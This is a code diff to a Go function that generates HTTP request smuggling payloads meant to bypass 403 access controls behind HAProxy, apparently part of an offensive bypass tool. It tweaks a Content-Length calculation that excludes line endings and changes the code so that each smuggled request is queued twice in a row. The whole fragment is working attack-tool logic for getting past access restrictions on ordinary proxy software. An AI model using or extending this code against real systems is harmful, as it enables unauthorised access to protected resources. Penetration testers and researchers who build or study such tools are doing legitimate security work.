@@ -59,10 +59,6 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 			publicPath, // PUBLIC path (for h:GET camouflage header)
 			host)
 
-		// Calculate content length WITHOUT \r\n sequences for HTTP smuggling compatibility
-		// Some proxies/servers don't count line endings in Content-Length processing
-		//requestWithoutCRLF := strings.ReplaceAll(smuggledRequest, "\r\n", "")
-		//calculatedContentLength := len(requestWithoutCRLF)
 		calculatedContentLength := len(smuggledRequest) - strings.Count(smuggledRequest, "\r") - strings.Count(smuggledRequest, "\n")
 
 		GB403Logger.Debug().Msgf("== HAProxy Smuggled Request ==")
@@ -97,16 +93,11 @@ func (pg *PayloadGenerator) GenerateHAProxyBypassPayloads(targetURL string, bypa
 
 		job.PayloadToken = GeneratePayloadToken(job)
 
-		// Add the job to our list
+		// HTTP Request Smuggling requires sending each request TWICE in sequence
 		allJobs = append(allJobs, job)
+		allJobs = append(allJobs, job) // Add the same job immediately twice
 	}
 
-	// HTTP Request Smuggling often requires sending the request TWICE
-	// Double the entire payload list (not just duplicate individual jobs)
-	doubledJobs := make([]BypassPayload, len(allJobs)*2)
-	copy(doubledJobs, allJobs)
-	copy(doubledJobs[len(allJobs):], allJobs)
-
-	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) (%d variations x2 for smuggling) for %s", len(doubledJobs), len(publicPaths), targetURL)
-	return doubledJobs
+	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payload(s) (%d variations x2 for smuggling) for %s", len(allJobs), len(publicPaths), targetURL)
+	return allJobs
 }
